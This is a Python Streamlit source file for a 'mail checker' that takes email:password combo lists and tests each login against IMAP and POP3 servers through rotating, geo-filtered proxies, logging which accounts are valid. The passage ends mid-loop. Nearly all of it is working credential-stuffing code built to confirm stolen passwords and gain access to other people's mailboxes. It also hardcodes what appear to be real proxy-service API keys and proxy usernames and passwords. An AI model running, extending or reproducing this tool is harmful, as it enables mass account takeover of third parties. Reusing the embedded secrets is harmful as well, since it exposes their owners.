import streamlit as st
import asyncio
import imaplib
import poplib
import ssl
import json
import os
import random
import threading
import socket
import sys
import time
import warnings
import glob
import zipfile
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from collections import defaultdict
import pandas as pd

# Optional network libs
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import requests
except ImportError:
    requests = None

try:
    import socks
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
socket.setdefaulttimeout(4.0)

# --- Page Config ---
st.set_page_config(
    page_title="Mega Ultimate Mail Checker",
    page_icon="⚡",
    layout="wide"
)

# --- Custom CSS for Styling ---
st.markdown("""
<style>
    .stSlider input[type=range] {
        accent-color: #ff4b4b;
        cursor: pointer;
    }
    .help-box {
        background-color: #1e1e2f;
        border-left: 3px solid #ff4b4b;
        padding: 6px 10px;
        margin: 2px 0 8px 0;
        font-size: 0.8rem;
        color: #d1d5db;
        border-radius: 4px;
    }
</style>
""", unsafe_allow_html=True)

st.title("⚡ Mega Ultimate Mail Checker v10 (Full Colab-Parity Edition)")
st.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with advanced proxy modes, geo-filtering, and automated ZIP archiving.")

# --- Config & Proxy Lists ---
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",
]

# --- State Management & Thread Locks ---
if "help_states" not in st.session_state:
    st.session_state.help_states = {}

def instant_help(key_name, description_text, label_text):
    """Renders label on left, small emoji question mark respond slow on right, big question mark side respond fast."""
    if key_name not in st.session_state.help_states:
        st.session_state.help_states[key_name] = {"visible": False, "time": 0}
    
    state_data = st.session_state.help_states[key_name]
    if state_data.get("visible", False):
        if time.time() - state_data.get("time", 0) > 10.0:
            st.session_state.help_states[key_name]["visible"] = False

    col_lbl, col_btn_small, col_btn_big = st.sidebar.columns([0.70, 0.15, 0.15])
    with col_lbl:
        st.markdown(f"**{label_text}**")
    with col_btn_small:
        if st.button("❓", key=f"help_btn_small_{key_name}", help="Slow response help"):
            time.sleep(0.3) # Simulate slow response as requested
            current = st.session_state.help_states[key_name]["visible"]
            st.session_state.help_states[key_name] = {
                "visible": not current,
                "time": time.time()
            }
            st.rerun()
    with col_btn_big:
        if st.button("❓", key=f"help_btn_big_{key_name}", help="Fast response help"):
            current = st.session_state.help_states[key_name]["visible"]
            st.session_state.help_states[key_name] = {
                "visible": not current,
                "time": time.time()
            }
            st.rerun()

    if st.session_state.help_states[key_name]["visible"]:
        st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

# --- Sidebar Control Panel ---
st.sidebar.header("⚙️ Engine Control Panel")

instant_help("workers", "Initial number of concurrent worker threads spawned to validate incoming accounts.", "Workers Start:")
workers = st.sidebar.slider("Workers Start Slider", min_value=1, max_value=50, value=10, step=1, label_visibility="collapsed")

instant_help("deadline", "Maximum execution time allotted per validation batch task.", "Deadline (s):")
deadline = st.sidebar.slider("Deadline Slider", min_value=5, max_value=120, value=25, step=5, label_visibility="collapsed")

instant_help("max_acc", "Maximum number of accounts to check in a single live run (0 for unlimited).", "Max Accounts:")
max_acc = st.sidebar.slider("Max Accounts Slider", min_value=0, max_value=5000, value=100, step=25, label_visibility="collapsed")

instant_help("timeout", "Socket communication timeout threshold for server responses.", "Timeout (s):")
timeout = st.sidebar.slider("Timeout Slider", min_value=2, max_value=30, value=10, step=1, label_visibility="collapsed")

instant_help("blacklist_cf", "Connection failure threshold before blacklisting specific error signatures.", "BlacklistCF:")
blacklist_cf = st.sidebar.slider("BlacklistCF Slider", min_value=0, max_value=500, value=100, step=10, label_visibility="collapsed")

st.sidebar.markdown("---")
st.sidebar.markdown("### 🌐 Proxy / Pool Configuration")

instant_help("min_proxy_score", "Only proxies with a smart health score greater than or equal to this value will be utilized.", "Min proxy score:")
min_proxy_score = st.sidebar.slider("Min proxy score Slider", min_value=0, max_value=100, value=40, step=5, label_visibility="collapsed")

instant_help("pool_mode", "Defines how proxies are filtered and loaded into the active rotation pool.", "Pool mode:")
pool_mode = st.sidebar.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=0, label_visibility="collapsed")

instant_help("country_code", "Target country specification code (e.g., US, GB, DE).", "Country code:")
country_code = st.sidebar.text_input("Country code input", value="US", label_visibility="collapsed")

instant_help("mix_list", "Comma-separated country list for blended regional proxy routing.", "Mix list:")
mix_list = st.sidebar.text_input("Mix list input", value="US,GB,DE", label_visibility="collapsed")

st.sidebar.markdown("---")
secret_portals = st.sidebar.checkbox("Secret Portals", value=True, help="Enable automatic discovery routes for non-standard provider ports.")
use_proxy = st.sidebar.checkbox("Use Proxy", value=True, help="Route all checker requests through proxy nodes to prevent IP rate-limiting.")
retry_cf = st.sidebar.checkbox("Retry CF", value=True, help="Automatically retry connection failures using alternative fallback paths.")
self_signed = st.sidebar.checkbox("Allow Self-Signed", value=True, help="Bypass strict SSL certificate validation errors for secure connections.")
proxy_test_flight = st.sidebar.checkbox("Test Flight", value=True, help="Perform an initial health and latency probe on proxies prior to live execution.")
skip_app = st.sidebar.checkbox("Skip Strict App-Only Providers", value=True, help="Filter out accounts requiring explicit app passwords or token generation upfront.")
debug_mode = st.sidebar.checkbox("Enable Debug Mode", value=False, help="Stream verbose logs and error tracing directly into the UI interface.")

resolved_proxy_mode = st.sidebar.selectbox(
    "PROXY_MODE:",
    options=["aggressive", "fallback", "sticky", "off"],
    index=0,
    help="Proxy routing strategy: 'aggressive' rotates per request, 'fallback' switches on failure, 'sticky' keeps one proxy per thread, 'off' disables proxy routing."
)

CFG = {
    "MAX_WORKERS_START": workers,
    "MAX_WORKERS_MAX": max(workers * 2, 25),
    "TIMEOUT": timeout,
    "ACCOUNT_DEADLINE": deadline,
    "MAX_ACCOUNTS": max_acc,
    "BLACKLIST_CF": blacklist_cf,
    "ENABLE_SECRET_PORTALS": secret_portals,
    "PROXY_MODE": "off" if not use_proxy else resolved_proxy_mode,
    "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
    "ALLOW_SELF_SIGNED": self_signed,
    "PROXY_TEST_FLIGHT": proxy_test_flight,
    "SKIP_STRICT_APP_PROVIDERS": skip_app,
    "DEBUG": debug_mode,
    "MIN_PROXY_SCORE": min_proxy_score,
    "POOL_MODE": pool_mode,
    "COUNTRY_CODE": country_code.strip().upper(),
    "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
    "PROXY_FILE": "proxies.txt",
    "RESULTS_DIR": "mail_results",
    "CACHE_FILE": "domain_cache.json",
    "PROXY_META_FILE": "proxy_meta.json",
    "MAX_PROXY_TRIES": 3,
    "PROXY_CONNECT_TIMEOUT": 4.0
}

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
except Exception:
    pass

with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
    st.json(CFG)

# --- State Management & Thread Locks ---
cache_lock = threading.Lock()
proxy_lock = threading.Lock()
bad_proxies = set()

def load_json(path, default=None):
    if default is None: default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading JSON {path}: {e}")
            return default
    return default

domain_cache = load_json(CFG["CACHE_FILE"], {})
proxy_meta = load_json(CFG["PROXY_META_FILE"], {})

def save_domain_cache():
    try:
        with cache_lock:
            with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                json.dump(domain_cache, f, indent=2)
    except Exception as e:
        print(f"Error saving domain cache: {e}")

def save_proxy_meta():
    try:
        with proxy_lock:
            with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Error saving proxy meta: {e}")

def load_proxies():
    if not os.path.exists(CFG["PROXY_FILE"]): return []
    dead_node_signature = "vhbigkpo"
    try:
        with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return [p for p in raw_list if dead_node_signature not in p]
    except Exception as e:
        print(f"Error reading proxies file: {e}")
        return []

def get_filtered_active_proxies():
    raw = load_proxies()
    filtered = []
    min_score = CFG.get("MIN_PROXY_SCORE", 40)
    pool_mode = CFG.get("POOL_MODE", "us_only")
    target_country = CFG.get("COUNTRY_CODE", "US")
    mix_countries = CFG.get("MIX_LIST", ["US", "GB", "DE"])

    for p in raw:
        if p in bad_proxies:
            continue
        meta = proxy_meta.get(p, {})
        score = meta.get("score", 50)
        country = meta.get("country", "Unknown").upper()

        if score < min_score:
            continue

        if pool_mode == "us_only":
            if "US" in country or "UNITED STATES" in country or "-country-US" in p:
                filtered.append(p)
        elif pool_mode == "all":
            filtered.append(p)
        elif pool_mode == "country":
            if target_country in country or target_country in p.upper():
                filtered.append(p)
        elif pool_mode == "mix":
            if any(mc in country or mc in p.upper() for mc in mix_countries):
                filtered.append(p)
        else:
            filtered.append(p)

    return filtered if filtered else raw

def parse_proxy(proxy_str):
    if not proxy_str: return None
    try:
        p = proxy_str.strip()
        if "://" in p:
            u = urlparse(p)
            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
        if "@" in p:
            cred, hostpart = p.rsplit("@", 1)
            user, pwd = cred.split(":", 1)
            host, port = hostpart.split(":", 1)
            return {"host": host, "port": int(port), "user": user, "pass": pwd}
        parts = p.split(":")
        if len(parts) == 4:
            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
        if len(parts) == 2:
            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
    except Exception as e:
        print(f"Proxy parse error for '{proxy_str}': {e}")
    return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    total = success_count + fail_count
    if total == 0:
        return initial_latency_score
    
    smoothed_success = success_count + 2
    smoothed_fail = fail_count + 1
    smoothed_total = smoothed_success + smoothed_fail
    
    success_rate = (smoothed_success / smoothed_total) * 100
    score = int(success_rate - (fail_count * 5))
    return max(0, min(100, score))

def test_single_proxy(proxy_str):
    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK: return False, "Invalid Format", "Unknown", 0
    start = time.time()
    sock = None
    test_success = False
    
    try:
        sock = socks.create_connection(
            ("8.8.8.8", 53), timeout=3.0,
            proxy_type=socks.SOCKS5, proxy_addr=info["host"], proxy_port=info["port"],
            proxy_username=info["user"], proxy_password=info["pass"])
        sock.close()
        test_success = True
    except Exception:
        if sock:
            try: sock.close()
            except Exception: pass
        try:
            sock = socks.create_connection(
                ("8.8.8.8", 53), timeout=3.0,
                proxy_type=socks.HTTP, proxy_addr=info["host"], proxy_port=info["port"],
                proxy_username=info["user"], proxy_password=info["pass"])
            sock.close()
            test_success = True
        except Exception as e:
            if sock:
                try: sock.close()
                except Exception: pass
            
    latency = int((time.time() - start) * 1000)
    initial_score = max(0, min(100, 100 - int(latency / 15)))
    
    country = proxy_meta.get(proxy_str, {}).get("country", "Unknown")
    region = proxy_meta.get(proxy_str, {}).get("region", "Unknown")

    if test_success and country == "Unknown" and requests:
        try:
            r = requests.get(f"http://ip-api.com/json/{info['host']}?fields=status,country,regionName", timeout=2.5)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    country = data.get("country", "Unknown")
                    region = data.get("regionName", "Unknown")
        except Exception:
            pass

    with proxy_lock:
        if proxy_str not in proxy_meta:
            proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region}
        
        m = proxy_meta[proxy_str]
        if test_success:
            m["success"] = m.get("success", 0) + 1
        else:
            m["fails"] = m.get("fails", 0) + 1
            
        m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0), initial_latency_score=initial_score)
        m["country"] = country
        m["region"] = region
    save_proxy_meta()

    current_score = proxy_meta[proxy_str]["score"]
    if test_success:
        return True, f"{latency}ms", f"{country}, {region}", current_score
    else:
        return False, "Connection Failed", f"{country}, {region}", current_score

def load_webshare(api_key):
    if requests is None or not api_key.strip():
        return []
    out = []
    try:
        headers = {"Authorization": f"Token {api_key.strip()}"}
        page = 1
        while page <= 5:
            url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code != 200:
                break
            data = r.json()
            items = data.get("results", [])
            if not items:
                break
            for it in items:
                try:
                    line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                    out.append(line)
                except Exception:
                    continue
            if not data.get("next"):
                break
            page += 1
        return out
    except Exception as e:
        print(f"Webshare fetch error: {e}")
        return []

if not proxy_meta and CFG.get("PROXY_TEST_FLIGHT", True) and requests:
    initial_raw = load_proxies()[:10]
    if initial_raw:
        for p in initial_raw:
            test_single_proxy(p)

all_proxies = load_proxies()
filtered_pool = get_filtered_active_proxies()

with st.sidebar:
    st.markdown("---")
    st.markdown("### 🌐 Proxy Management & Health")
    st.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
    
    with st.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = st.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
        if st.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines() if l.strip() and not l.startswith("#")]
                    existing = load_proxies()
                    combined = list(dict.fromkeys(existing + new_proxies))
                    with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                        f.write("\n".join(combined) + "\n")
                    st.success(f"Added {len(new_proxies)} custom proxies successfully!")
                    st.rerun()
                except Exception as ex:
                    st.error(f"Error saving custom proxies: {ex}")
    
    if st.button("📥 Fetch & Test All Proxies"):
        if requests is None:
            st.error("Missing 'requests' library.")
        else:
            with st.spinner("Fetching from Webshare & Oxylabs..."):
                all_raw = []
                for key in WEBSHARE_KEYS:
                    all_raw.extend(load_webshare(key))
                for ox in OXYLABS_PROXIES:
                    all_raw.append(ox)
                
                all_raw = list(dict.fromkeys(all_raw))
                alive = []
                
                try:
                    with ThreadPoolExecutor(max_workers=15) as ex:
                        future_to_proxy = {ex.submit(test_single_proxy, proxy): proxy for proxy in all_raw}
                        for future in future_to_proxy:
                            proxy_str = future_to_proxy[future]
                            try:
                                res = future.result()
                                if res and res[0]:
                                    alive.append(proxy_str)
                            except Exception:
                                continue
                except Exception as ex:
                    st.error(f"Proxy thread pool error: {ex}")
                    
                try:
                    with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                        f.write("\n".join(str(item) for item in alive) + ("\n" if alive else ""))
                except Exception as ex:
                    st.error(f"Failed to write proxies file: {ex}")

            st.success(f"Success! Saved {len(alive)} operational proxies.")
            st.rerun()

    with st.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        if proxy_meta:
            proxy_data_list = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                host_port = f"{info['host']}:{info['port']}" if info else "Unknown"
                proxy_data_list.append({
                    "Proxy": host_port,
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0)
                })
            df_proxies = pd.DataFrame(proxy_data_list)
            st.dataframe(df_proxies, use_container_width=True)
            if st.button("🧹 Clear Dead / Low-Score Proxies"):
                with proxy_lock:
                    for k, m in list(proxy_meta.items()):
                        if m.get("score", 50) < 20 or m.get("fails", 0) >= 5:
                            proxy_meta.pop(k, None)
                save_proxy_meta()
                st.success("Cleaned low-scoring proxies!")
                st.rerun()
        else:
            st.info("No proxy metadata recorded yet.")

# --- Pre-filter Engine ---
DISPOSABLE = {
    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}

COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne"
}

STRICT_APP_PROVIDERS = {
    "gmail.com", "googlemail.com",
    "outlook.com", "hotmail.com", "live.com", "windowslive.com"
}

ZERO_ACCESS_PROVIDERS = {
    "proton.me", "protonmail.com", "pm.me",
    "tuta.io", "tutanota.com", "tutamail.com", "tuta.com"
}

def is_disposable(email):
    try:
        return email.split("@")[-1].lower().strip() in DISPOSABLE
    except Exception:
        return False

def load_previous_valid():
    seen = set()
    try:
        paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            if os.path.exists(extra):
                paths.append(extra)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if ":" in line:
                            email = line.split(":")[0].strip().lower()
                            if email:
                                seen.add(email)
            except Exception:
                continue
    except Exception:
        pass
    return seen

def process_accounts(text, previous_valid):
    lines, skipped_disp, skipped_typo, skipped_resume, skipped_app_skip, skipped_bad = [], 0, 0, 0, 0, 0
    try:
        for line in text.splitlines():
            line = line.strip().strip('"').strip("'")
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                skipped_bad += 1
                continue

            parts = line.split(":", 1)
            email = parts[0].strip().lower()
            password = parts[1].strip() if len(parts) > 1 else ""

            if not email or "@" not in email or not password:
                skipped_bad += 1
                continue
            domain = email.split("@")[-1].lower()
            if CFG.get("SKIP_STRICT_APP_PROVIDERS", False) and domain in STRICT_APP_PROVIDERS:
                skipped_app_skip += 1
                continue
            if is_disposable(email):
                skipped_disp += 1
                continue
            if domain in COMMON_TYPOS:
                skipped_typo += 1
                continue
            if email in previous_valid:
                skipped_resume += 1
                continue
            if ".." in email or email.count("@") != 1:
                skipped_bad += 1
                continue
            lines.append(f"{email}:{password}")
    except Exception as e:
        print(f"Account processing error: {e}")

    seen_email, clean = set(), []
    for line in lines:
        try:
            em = line.split(":")[0].strip().lower()
            if em not in seen_email:
                seen_email.add(em)
                clean.append(line)
        except Exception:
            continue

    return clean, skipped_disp, skipped_typo, skipped_resume, skipped_app_skip, skipped_bad

# --- Main Input Section ---
st.markdown("---")
st.markdown("### 📥 Accounts Input & Pre-Filtering")

input_tab1, input_tab2 = st.tabs(["📝 Paste Combos", "📁 Upload Combo File"])
raw_text = ""

with input_tab1:
    raw_text = st.text_area(
        "Paste accounts here (email:password format):",
        placeholder="user@example.com:password123",
        height=150
    )

with input_tab2:
    uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"])
    if uploaded_file is not None:
        try:
            raw_text = uploaded_file.getvalue().decode("utf-8", errors="ignore")
        except Exception:
            try:
                raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
            except Exception:
                raw_text = ""
        st.success("File uploaded successfully!")

clean_lines = []
if raw_text:
    previous_valid = load_previous_valid()
    clean_lines, disp, typo, resume, app_skip, bad = process_accounts(raw_text, previous_valid)
    
    col_m1, col_m2, col_m3, col_m4, col_m5 = st.columns(5)
    col_m1.metric("Ready to Check", len(clean_lines))
    col_m2.metric("Disposables Dropped", disp)
    col_m3.metric("Typos Dropped", typo)
    col_m4.metric("Resume Skipped", resume)
    col_m5.metric("App-Skipped", app_skip)

# --- Checking Protocol Functions ---
PROVIDER_MAP = {
    "gmail.com": {"imap": ["imap.gmail.com"], "pop3": ["pop.gmail.com"]},
    "googlemail.com": {"imap": ["imap.gmail.com"], "pop3": ["pop.gmail.com"]},
    "outlook.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "hotmail.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "live.com": {"imap": ["outlook.office365.com"], "pop3": ["outlook.office365.com"]},
    "yahoo.com": {"imap": ["imap.mail.yahoo.com"], "pop3": ["pop.mail.yahoo.com"]},
    "icloud.com": {"imap": ["imap.mail.me.com"], "pop3": ["pop.mail.me.com"]},
    "naver.com": {"imap": ["imap.naver.com"], "pop3": ["pop.naver.com"]},
    "qq.com": {"imap": ["imap.qq.com"], "pop3": ["pop.qq.com"]}
}

PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())

def get_mx_hosts(domain):
    if not dns: return []
    try:
        answers = dns.resolver.resolve(domain, "MX")
        return [str(r.exchange).lower().rstrip(".") for r in answers]
    except Exception:
        return []

def get_servers(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in ZERO_ACCESS_PROVIDERS:
            return {"imap": [], "pop3": [], "type": "zero_access"}
        
        with cache_lock:
            if domain in domain_cache:
                return domain_cache[domain]
                
        if domain in PROVIDER_MAP:
            return PROVIDER_MAP[domain]

        mx = get_mx_hosts(domain)
        servers = {"imap": [], "pop3": []}
        for m in mx:
            if "google" in m or "gmail" in m:
                servers["imap"].append("imap.gmail.com")
                servers["pop3"].append("pop.gmail.com")
            elif "outlook" in m or "protection.outlook" in m:
                servers["imap"].append("outlook.office365.com")
                servers["pop3"].append("outlook.office365.com")
            elif "yahoo" in m:
                servers["imap"].append("imap.mail.yahoo.com")
                servers["pop3"].append("pop.mail.yahoo.com")

        servers["imap"].extend([f"imap.{domain}", f"mail.{domain}", domain])
        servers["pop3"].extend([f"pop.{domain}", f"mail.{domain}", domain])
        servers["imap"] = list(dict.fromkeys(servers["imap"]))
        servers["pop3"] = list(dict.fromkeys(servers["pop3"]))
        
        with cache_lock:
            domain_cache[domain] = servers
        save_domain_cache()
        return servers
    except Exception:
        return {"imap": [email.split("@")[-1]], "pop3": [email.split("@")[-1]]}

def update_proxy_score(proxy_str, success=True):
    try:
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"score": 50, "fails": 0, "success": 0}
            m = proxy_meta[proxy_str]
            if success:
                m["success"] = m.get("success", 0) + 1
            else:
                m["fails"] = m.get("fails", 0) + 1
                if m["fails"] >= 3:
                    bad_proxies.add(proxy_str)
            
            m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
        save_proxy_meta()
    except Exception as e:
        print(f"Proxy score update error: {e}")

def proxy_connect(host, port, proxy_str, timeout=None):
    base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
        
    effective_timeout = max(2.0, base_timeout - (fails * 0.5))
    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK: raise RuntimeError("bad proxy format or socks unavailable")

    sock = None
    for ptype in (socks.SOCKS5, socks.HTTP):
        try:
            sock = socks.create_connection(
                (host, port), timeout=effective_timeout,
                proxy_type=ptype, proxy_addr=info["host"], proxy_port=info["port"],
                proxy_username=info["user"], proxy_password=info["pass"])
            sock.settimeout(CFG["TIMEOUT"])
            return sock
        except Exception as e:
            if sock:
                try: sock.close()
                except Exception: pass
            err_str = str(e).lower()
            if any(x in err_str for x in ["407", "0x02", "connection not allow", "refused", "timed out"]):
                bad_proxies.add(proxy_str)
    raise RuntimeError("proxy connect failed")

def ssl_wrap(sock, host, insecure=False):
    try:
        ctx = ssl._create_unverified_context() if (insecure or CFG.get("ALLOW_SELF_SIGNED")) else ssl.create_default_context()
        return ctx.wrap_socket(sock, server_hostname=host)
    except Exception:
        ctx = ssl._create_unverified_context()
        return ctx.wrap_socket(sock, server_hostname=host)

def classify_error(err, domain=""):
    try:
        err = (err or "").lower()
        if domain in ZERO_ACCESS_PROVIDERS or any(k in err for k in ["zero-access", "bridge", "local connection"]):
            return "need_app_password"
        if any(keyword in err for keyword in ["application-specific password", "app password", "two-factor", "mfa", "web login"]):
            return "need_app_password"
        if any(x in err for x in ["authentication failed", "login failed", "invalid credentials", "auth failed", "invalid login", "bad username", "command error", "logon failure"]):
            return "need_app_password" if domain in PUBLIC_PROVIDERS else "wrong_password"
    except Exception:
        pass
    return "connection_failed"

def imap_once(email, password, server, proxy_str=None, insecure=False):
    class PIMAP(imaplib.IMAP4_SSL):
        def open(self, host="", port=993, timeout=None):
            raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
            self.sock = ssl_wrap(raw, host, insecure=insecure)
            try:
                self.file = self.sock.makefile("rb")
            except Exception:
                pass
    mail = PIMAP(server)
    mail.login(email, password)
    mail.logout()

def pop_once(email, password, server, proxy_str=None, insecure=False):
    raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
    ssock = ssl_wrap(raw, server, insecure=insecure)
    mail = poplib.POP3(server)
    mail.sock = ssock
    try:
        mail.file = ssock.makefile("rb")
    except Exception:
        pass
    mail._debugging = 0
    mail.welcome = mail._getresp()
    mail.user(email)
    mail.pass_(password)
    mail.quit()

def check_account_sync(email, password, conf, domain, proxy_pool, thread_state):
    try:
        if conf.get("type") == "zero_access":
            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None

        proxy_mode = CFG.get("PROXY_MODE", "aggressive")
        prefer_insecure = CFG.get("ALLOW_SELF_SIGNED", True)
        
        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy"):
                    thread_state["sticky_proxy"] = random.choice(proxy_pool)
                px = thread_state["sticky_proxy"]
            else:
                px = random.choice(proxy_pool)

        proxies_to_try = [px] if px else [None]
        if proxy_mode == "fallback" and px:
            proxies_to_try.append(None)

        for current_px in proxies_to_try:
            for server in conf.get("imap", [])[:3]:
                try:
                    imap_once(email, password, server, current_px, insecure=prefer_insecure)
                    if current_px: update_proxy_score(current_px, True)
                    return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px
                except Exception as e:
                    st = classify_error(str(e), domain)
                    if current_px: update_proxy_score(current_px, False)
                    if st in ("wrong_password", "need_app_password"):
                        return None, st, f"IMAP {server} -> {st}", current_px

            for server in conf.get("pop3", [])[:3]:
                try:
                    pop_once(email, password, server, current_px, insecure=prefer_insecure)
                    if current_px: update_proxy_score(current_px, True)
                    return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px
                except Exception as e:
                    st = classify_error(str(e), domain)
                    if current_px: update_proxy_score(current_px, False)
                    if st in ("wrong_password", "need_app_password"):
                        return None, st, f"POP3 {server} -> {st}", current_px

    except Exception as e:
        return None, "connection_failed", str(e)[:40], None

    return None, "connection_failed", "all hosts failed", None

# --- Execution Trigger & Export Integration ---
st.markdown("---")
st.markdown("### 🚀 Execute Live Checker Engine")

if st.button("🔥 Start Live Checking Engine", type="primary"):
    if not clean_lines:
        st.warning("⚠️ Please load and filter accounts first.")
    else:
        active_proxy_pool = get_filtered_active_proxies()
        
        valid_results = []
        wrong_results = []
        need_app_results = []
        conn_results = []
        
        progress_bar = st.progress(0)
        status_text = st.empty()
        
        log_expander = st.expander("📝 Live Execution & Error Log Stream", expanded=True)
        log_container = log_expander.empty()
        log_lines = []
        
        accounts_to_check = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
        total_accs = len(accounts_to_check)
        checked_count = 0
        
        thread_local = threading.local()
        
        def check_task(line):
            try:
                if ":" not in line: 
                    return {"line": f"{line} | Error: Invalid format", "status": "connection_failed"}
                email, password = line.split(":", 1)
                email, password = email.strip(), password.strip()
                domain = email.split("@")[-1].lower()
                conf = get_servers(email)
                
                if not hasattr(thread_local, "state"):
                    thread_local.state = {}
                
                server, status, detail, px_used = check_account_sync(email, password, conf, domain, active_proxy_pool, thread_local.state)
                return {"line": f"{email}:{password} | {detail}", "email": email, "status": status, "detail": detail}
            except Exception as ex:
                return {"line": f"{line} | Error: {ex}", "email": line, "status": "connection_failed", "detail": str(ex)}

        current_workers = CFG["MAX_WORKERS_START"]

        try:
            with ThreadPoolExecutor(max_workers=current_workers) as executor:
                futures = {executor.submit(check_task, line): line for line in accounts_to_check}
                
                for future in as_completed(futures):
                    checked_count += 1
                    try:
                        res = future.result()
                        if res:
                            st_val = res["status"]
                            if st_val == "valid":
                                valid_results.append(res["line"])
                            elif st_val == "wrong_password":
                                wrong_results.append(res["line"])
                            elif st_val == "need_app_password":
                                need_app_results.append(res["line"])
                            else:
                                conn_results.append(res["line"])
                            
                            log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
                            log_lines.append(log_msg)
                            if len(log_lines) > 50:
                                log_lines.pop(0)
